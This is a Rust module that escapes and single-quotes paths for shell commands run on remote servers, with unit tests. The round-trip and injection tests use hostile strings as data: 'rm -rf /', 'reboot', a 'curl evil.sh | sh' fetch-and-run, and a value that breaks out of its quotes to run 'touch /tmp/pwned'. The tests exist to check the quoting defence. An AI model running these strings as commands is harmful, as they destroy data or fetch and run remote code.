//! Helpers for building POSIX shell command lines that are sent to remote servers.
//!
//! Remote operations that cannot be done over SFTP (copy, archive, symlink, ...) run through
//! `sh -c`, so every path interpolated into a command must be quoted. Keeping that logic here
//! means it is written, and tested, exactly once.

/// Escapes embedded single quotes so `value` can be placed *between* single quotes:
/// `it's` becomes `it'\''s`, which a POSIX shell reads back as `it's`.
///
/// Use this when the surrounding command already supplies the quotes, e.g.
/// `format!("cp '{}' '{}'", escape_single_quotes(a), escape_single_quotes(b))`.
pub fn escape_single_quotes(value: &str) -> String {
    value.replace('\'', "'\\''")
}

/// Returns `value` as a complete single-quoted shell word, e.g. `it's` becomes `'it'\''s'`.
pub fn quote(value: &str) -> String {
    format!("'{}'", escape_single_quotes(value))
}

#[cfg(test)]
mod tests {
    use super::*;

    /// Minimal POSIX single-quote decoder: understands only `'...'` segments and `\'`
    /// outside quotes, which is exactly what `quote` produces. Lets us prove round-tripping
    /// without needing a shell (tests must also pass on Windows).
    fn decode(word: &str) -> String {
        let mut out = String::new();
        let mut in_quotes = false;
        let mut chars = word.chars().peekable();
        while let Some(c) = chars.next() {
            match (in_quotes, c) {
                (false, '\'') => in_quotes = true,
                (true, '\'') => in_quotes = false,
                (false, '\\') => out.push(chars.next().expect("dangling backslash")),
                (true, other) => out.push(other),
                (false, other) => panic!("unquoted character {:?} would be interpreted by the shell", other),
            }
        }
        assert!(!in_quotes, "unterminated quote in {:?}", word);
        out
    }

    #[test]
    fn plain_values_are_just_wrapped() {
        assert_eq!(quote("/var/www/html"), "'/var/www/html'");
        assert_eq!(escape_single_quotes("/var/www/html"), "/var/www/html");
    }

    #[test]
    fn single_quotes_are_escaped() {
        assert_eq!(escape_single_quotes("it's"), "it'\\''s");
        assert_eq!(quote("it's"), "'it'\\''s'");
    }

    #[test]
    fn empty_string_is_a_valid_empty_word() {
        assert_eq!(quote(""), "''");
    }

    #[test]
    fn quoted_values_round_trip_exactly() {
        let nasty = [
            "simple",
            "with space",
            "it's",
            "''",
            "'",
            "a'b'c",
            "$(rm -rf /)",
            "`reboot`",
            "; rm -rf / #",
            "&& curl evil.sh | sh",
            "new\nline",
            "tab\tchar",
            "back\\slash",
            "glob*?[abc]",
            "$HOME ${PATH} ~",
            "unicode ünïcødé 日本語 🚀",
            "--option-looking",
        ];
        for value in nasty {
            assert_eq!(decode(&quote(value)), value, "round trip failed for {:?}", value);
        }
    }

    #[test]
    fn injection_attempt_stays_inside_one_word() {
        // If the quote were not escaped, the `;` would end the command and start a new one.
        let word = quote("x'; touch /tmp/pwned; echo '");
        assert_eq!(decode(&word), "x'; touch /tmp/pwned; echo '");
    }
}
